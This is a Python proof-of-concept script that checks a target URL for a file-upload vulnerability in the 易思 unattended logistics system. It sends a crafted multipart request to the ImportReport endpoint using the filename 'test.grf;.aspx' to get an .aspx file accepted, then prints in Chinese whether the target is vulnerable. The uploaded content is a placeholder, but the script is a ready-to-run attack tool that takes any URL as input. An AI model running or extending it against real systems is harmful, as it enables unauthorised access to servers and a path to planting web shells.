# coding: utf-8
import argparse
import requests

poc = '/Sys_ReportFile/ImportReport?encode=b'
headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "X-File-Name": "test.grf",
        "Content-Type": "multipart/form-data; boundary= ----WebKitFormBoundaryxzUhGld6cusN3Alk"
    }

data = '''------WebKitFormBoundaryxzUhGld6cusN3Alk\r\nContent-Disposition: form-data; name="file"; .filename="test.grf;.aspx"\r\nContent-Type: application/octet-stream\r\n\r\n123456\r\n------WebKitFormBoundaryxzUhGld6cusN3Alk--'''
def main():
    parser = argparse.ArgumentParser(description='A script that uses argparse to handle command-line arguments.')
    parser.add_argument('-u', '--url', help='URL argument')
    args = parser.parse_args()
    url_argument = args.url
    if url_argument:
        reps = requests.post(url_argument+poc,headers=headers,data=data,timeout=5,verify=False)
        if reps.status_code == 200 and "aspx" in reps.text:
            print(f"存在易思智能物流无人值守系统文件上传 : {url_argument}{reps.text}")
        else:
            print(f"未发现易思智能物流无人值守系统文件上传 : {url_argument}")
    else:
        print("eg. : python3 易思智能物流无人值守系统文件上传.py -u http://xx.xx.xx.xx:8080")

if __name__ == "__main__":
    main()
